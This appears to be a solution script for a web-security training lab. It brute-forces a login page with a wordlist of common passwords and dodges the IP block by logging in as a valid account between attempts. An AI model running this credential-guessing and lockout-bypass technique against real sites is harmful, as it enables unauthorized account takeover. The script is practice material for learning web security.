import requests

# Broken brute-force protection, IP block

# to solve this lab brute force password for target victim
# after 4 tries ip your ip is blocked so try to add X-Forwarded-For


passwords = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234",
    "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football",
    "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321",
    "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx",
    "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1",
    "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer",
    "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000",
    "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars",
    "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper",
    "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777",
    "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua",
    "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea",
    "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin",
    "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor", "monitoring",
    "montana", "moon", "moscow"
]


url = "https://0a60008604e213d08092944200b80064.web-security-academy.net/login"

data = {
    "username": "carlos",
    "password": "peter"
}
reqNum=1
i=1

def temRequest(i):
    if i%2 ==0:
        data = {
            "username": "wiener",
            "password": "peter"
        }
        respone = requests.post(url=url, data=data)

for password in passwords:
    data['password'] = password
    i+=1
    temRequest(i)
    respone = requests.post(url=url, data=data)
    print(respone.status_code)
    if "You have made too many incorrect login attempts. Please try again in 1 minute(s)." in respone.text:
        print("errors")
    if "Incorrect password" not in respone.text:
        print(f"username:carlos :password:{password}")
        exit()




